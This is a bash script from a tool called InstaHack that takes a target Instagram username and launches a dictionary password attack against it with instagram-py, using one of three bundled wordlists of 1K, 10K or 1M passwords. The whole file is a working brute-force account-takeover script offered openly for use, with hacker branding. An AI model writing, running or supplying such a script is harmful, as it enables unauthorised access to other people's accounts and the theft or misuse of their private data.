#!/bin/bash
# auto.sh - InstaHack
#
# The shell / bash script that gives the user the option for automatic password wordlist selections. The tool provides the user with three wordlist files : 1K password file (pass1.txt), 10K password file (pass2.txt) and the 1M passwords file (pass3.txt). Thus, here the user is not required to create a custom wordlist file of passwords like what the user needs to do when using the manual version of this attack.
#
# Author : Waseem Akram (https://github.com/evildevill/)
# Created on : June 28, 2020
#
# Last modified by : Rishav Das (https://github.com/rdofficial/)
# Last modified on : May 10, 2021
#
# Changes made in the last modification :
# 1. Adding commented docs and more comments to the script's code in order to make it more clean and easily readable to the programmers and other hackers.
# 2. Removing some errors and also adding more proper output and specially the colored output system.
# 3. Also, we removed the dependency of the 'lolcat' package in this script file too.
#

# Defining the ANSII color codes variables for colored output
RED="\033[91m"
GREEN="\033[92m"
YELLOW="\033[93m"
BLUE="\033[94m"
RED_REV="\033[07;91m"
DEFCOL="\033[00m"


# Displaying the banner of the tool on the console screen
clear
echo -e "${YELLOW}
 ____  _  _  ___  ____   __    _   _    __    ___  _  _ 
(_  _)( \( )/ __)(_  _) /__\  ( )_( )  /__\  / __)( )/ )
 _)(_  )  ( \__ \  )(  /(__)\  ) _ (  /(__)\( (__  )  ( 
(____)(_)\_)(___/ (__)(__)(__)(_) (_)(__)(__)\___)(_)\_)
                ${DEFCOL}[${RED}#${DEFCOL}] ${BLUE}Auto Password Attack ${DEFCOL}[${RED}#${DEFCOL}]"
echo -e "\n                \e[101m\e[1;77m  >>  Script By WASII << \e[0m\n"
echo -e "\n       \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m Hacker wasii \e[100m\e[1;77m << \e[0m\n"

# Asking the user to enter the username of the target instagram account
read -p "[#] Enter the username of the target : " usrnm

# Asking the user to enter a choice for the wordlist
# ----
# 1. The wordlist files that the user will choose are already available in the pass/ sub-directory of the project.
# 2. There are three wordlist files : 1K passwords, 10K passwords, and 1M passwords.
# ----
echo -e "\nChoose any of the options below :
${GREEN}[${RED}1${GREEN}] ${YELLOW}1K passwords wordlist file${DEFCOL}
${GREEN}[${RED}2${GREEN}] ${YELLOW}10K passwords wordlist file${DEFCOL}
${GREEN}[${RED}3${GREEN}] ${YELLOW}1M passwords wordlist file${DEFCOL}\n"
read -p "[#] Enter your choice: " choice

# Checking the user entered option
if [[ $choice == "1" ]]; then
	# If the user entered the option for the 1K password wordlist file

	instagram-py --username $usrnm --password-list $HOME/instahack/pass/pass1.txt 
elif [[ $choice == "2" ]]; then
	# If the user entered the option for the 10K password wordlist file

	instagram-py --username $usrnm --password-list $HOME/instahack/pass/pass2.txt
elif [[ $choice == "3" ]]; then
	# If the user entered the option for the 1M password wordlist file

	instagram-py --username $usrnm --password-list $HOME/instahack/pass/pass3.txt
else
	# If the user entered option is not recognized (not one of the 3 wordlist files), then we display the error on the console screen

	echo -e "\n${RED_REV}[ Error : No such options for wordlist files available ]${DEFCOL}"
	exit
fi

# If we reach upto here, that means the script executed properly. Now, we will again launch the instahack.sh script (the main script file for the tool)
sleep 5
cd $HOME/instahack
bash instahack.sh
